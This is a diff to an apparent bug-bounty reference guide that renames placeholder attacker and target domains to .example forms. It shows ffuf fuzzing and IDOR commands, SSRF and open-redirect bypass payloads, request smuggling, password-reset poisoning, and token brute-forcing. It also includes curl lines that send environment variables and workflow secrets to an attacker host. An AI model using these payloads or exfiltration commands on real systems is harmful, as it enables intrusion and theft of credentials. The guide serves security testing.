@@ -231,7 +231,7 @@ cat semgrep-results.json | jq '.results[] | select(.extra.severity == "ERROR") |
 ## FFUF Advanced Techniques
 ```bash
 # THE ONE RULE: Always use -ac (auto-calibrate filters noise automatically)
-ffuf -w wordlist.txt -u https://target.com/FUZZ -ac
+ffuf -w wordlist.txt -u https://target.example/FUZZ -ac
 
 # Authenticated raw request file — IDOR testing (save Burp request to req.txt, replace ID with FUZZ)
 seq 1 10000 | ffuf --request req.txt -w - -ac
@@ -240,13 +240,13 @@ seq 1 10000 | ffuf --request req.txt -w - -ac
 ffuf -u https://TARGET/api/FUZZ -w wordlist.txt -H "Cookie: session=TOKEN" -ac
 
 # Parameter discovery
-ffuf -w ~/wordlists/burp-parameter-names.txt -u "https://target.com/api/endpoint?FUZZ=test" -ac -mc 200
+ffuf -w ~/wordlists/burp-parameter-names.txt -u "https://target.example/api/endpoint?FUZZ=test" -ac -mc 200
 
 # Hidden POST parameters
-ffuf -w ~/wordlists/burp-parameter-names.txt -X POST -d "FUZZ=test" -u "https://target.com/api/endpoint" -ac
+ffuf -w ~/wordlists/burp-parameter-names.txt -X POST -d "FUZZ=test" -u "https://target.example/api/endpoint" -ac
 
 # Subdomain scan
-ffuf -w subs.txt -u https://FUZZ.target.com -ac
+ffuf -w subs.txt -u https://FUZZ.target.example -ac
 
 # Filter strategies:
 # -fc 404,403          Filter status codes
@@ -320,7 +320,7 @@ curl -s "https://hackerone.com/graphql" \
 - [ ] Default credentials on admin panels
 - [ ] JS secrets (SecretFinder, jsluice)
 - [ ] Open redirects (`?redirect=`, `?next=`, `?url=`)
-- [ ] CORS misconfig (test `Origin: https://evil.com` + credentials)
+- [ ] CORS misconfig (test `Origin: https://evil.example` + credentials)
 - [ ] S3/cloud buckets
 - [ ] GraphQL introspection enabled
 - [ ] Spring actuators (`/actuator/env`, `/actuator/heapdump`)
@@ -546,9 +546,9 @@ grep -rn "TODO\|FIXME\|not signed\|not verified\|for now" --include="*.rs" | gre
 | Short IP | `http://127.1/` | Abbreviated notation |
 | IPv6 | `http://[::1]/` | Loopback in IPv6 |
 | IPv6-mapped | `http://[::ffff:127.0.0.1]/` | IPv4-mapped IPv6 |
-| Redirect chain | `http://attacker.com/302->http://169.254.169.254` | Check each hop |
+| Redirect chain | `http://attacker.example/302->http://169.254.169.254` | Check each hop |
 | DNS rebinding | Register domain resolving to 127.0.0.1 | First check = external, fetch = internal |
-| URL encoding | `http://127.0.0.1%2523@attacker.com` | Parser confusion |
+| URL encoding | `http://127.0.0.1%2523@attacker.example` | Parser confusion |
 | Enclosed alphanumeric | `http://①②⑦.⓪.⓪.①` | Unicode numerals |
 | Protocol smuggling | `gopher://127.0.0.1:6379/_INFO` | Redis/other protocols |
 
@@ -574,16 +574,16 @@ Use these when chaining open redirect into OAuth code theft:
 | Bypass | Payload | Notes |
 |--------|---------|-------|
 | Double URL encoding | `%252F%252F` | Decodes to `//` after double decode |
-| Backslash | `https://target.com\@evil.com` | Some parsers normalize `\` to `/` |
-| Missing protocol | `//evil.com` | Protocol-relative |
-| @-trick | `https://target.com@evil.com` | target.com becomes username |
-| Protocol-relative | `///evil.com` | Triple slash |
+| Backslash | `https://target.example\@evil.example` | Some parsers normalize `\` to `/` |
+| Missing protocol | `//evil.example` | Protocol-relative |
+| @-trick | `https://target.example@evil.example` | target.example becomes username |
+| Protocol-relative | `///evil.example` | Triple slash |
 | Tab/newline injection | `//evil%09.com` | Whitespace in hostname |
-| Fragment trick | `https://evil.com#target.com` | Fragment misleads validation |
-| Null byte | `https://evil.com%00target.com` | Some parsers truncate at null |
-| Parameter pollution | `?next=target.com&next=evil.com` | Last value wins |
+| Fragment trick | `https://evil.example#target.example` | Fragment misleads validation |
+| Null byte | `https://evil.example%00target.com` | Some parsers truncate at null |
+| Parameter pollution | `?next=target.example&next=evil.example` | Last value wins |
 | Path confusion | `/redirect/..%2F..%2Fevil.com` | Path traversal in redirect |
-| Unicode normalization | `https://evil.com/target.com` | Visual confusion |
+| Unicode normalization | `https://evil.example/target.example` | Visual confusion |
 
 ## File Upload
 
@@ -769,7 +769,7 @@ When target has AI agents with tool access, these are the 10 attack classes:
 ### CL.TE Example
 ```http
 POST / HTTP/1.1
-Host: target.com
+Host: target.example
 Content-Length: 13
 Transfer-Encoding: chunked
 
@@ -829,7 +829,7 @@ github.head_ref
 
 - [ ] **Expression injection** — `${{ github.event.issue.title }}` in `run:` block = RCE
   ```yaml
-  # VULNERABLE — attacker creates issue with title: a]]; curl https://evil.com/$(env | base64) #
+  # VULNERABLE — attacker creates issue with title: a]]; curl https://evil.example/$(env | base64) #
   run: echo "${{ github.event.issue.title }}"
 
   # FIXED — use env var (shell-quoted, not expression-interpolated)
@@ -925,7 +925,7 @@ github.head_ref
 
 ### Category 4: Credential & Secret Protection
 
-- [ ] **Secret exfiltration** — `curl https://evil.com/${{ secrets.TOKEN }}` in workflow
+- [ ] **Secret exfiltration** — `curl https://evil.example/${{ secrets.TOKEN }}` in workflow
 - [ ] **Secrets in artifacts** — uploaded artifacts contain `.env`, credentials, or hidden files
   ```yaml
   # FIXED — exclude hidden files
@@ -1182,20 +1182,20 @@ nuclei -l /tmp/subs.txt -t ~/nuclei-templates/takeovers/ -o /tmp/takeovers.txt
 ```
 
 ### Impact Escalation
-- Basic takeover: serve page under target.com subdomain -> Low/Medium
-- + Cookies: if target.com sets cookie with domain=.target.com -> credential theft -> High
-- + OAuth redirect: if sub.target.com is a registered redirect_uri -> ATO chain -> Critical
-- + CSP bypass: if sub.target.com is in target's CSP -> XSS anywhere -> Critical
+- Basic takeover: serve page under target.example subdomain -> Low/Medium
+- + Cookies: if target.example sets cookie with domain=.target.example -> credential theft -> High
+- + OAuth redirect: if sub.target.example is a registered redirect_uri -> ATO chain -> Critical
+- + CSP bypass: if sub.target.example is in target's CSP -> XSS anywhere -> Critical
 
 ## ATO -- Account Takeover (Complete Taxonomy)
 
 ### Path 1: Password Reset Poisoning (Host Header Injection)
 ```bash
 POST /forgot-password
-Host: attacker.com
+Host: attacker.example
 Content-Type: application/x-www-form-urlencoded
 email=victim@company.com
-# If reset link = https://attacker.com/reset?token=XXXX -> ATO
+# If reset link = https://attacker.example/reset?token=XXXX -> ATO
 # Also try: X-Forwarded-Host, X-Host, X-Forwarded-Server
 ```
 
@@ -1205,7 +1205,7 @@ After clicking reset link, if page loads external resources -> token in Referer 
 ### Path 3: Predictable / Weak Reset Tokens
 ```bash
 # If token < 16 hex chars or numeric only -> brute-forceable
-ffuf -u "https://target.com/reset?token=FUZZ" -w <(seq -w 000000 999999) -fc 404 -t 50
+ffuf -u "https://target.example/reset?token=FUZZ" -w <(seq -w 000000 999999) -fc 404 -t 50
 ```
 
 ### Path 4: Token Not Expiring / Reuse
@@ -1214,7 +1214,7 @@ Request token -> wait 2 hours -> use it -> still works? Request token #1 -> requ
 ### Path 5: Email Change Without Re-Authentication
 ```bash
 PUT /api/user/email
-{"new_email": "attacker@evil.com"}
+{"new_email": "attacker@evil.example"}
 # If no current_password required -> attacker changes email -> locks out victim
 ```
 
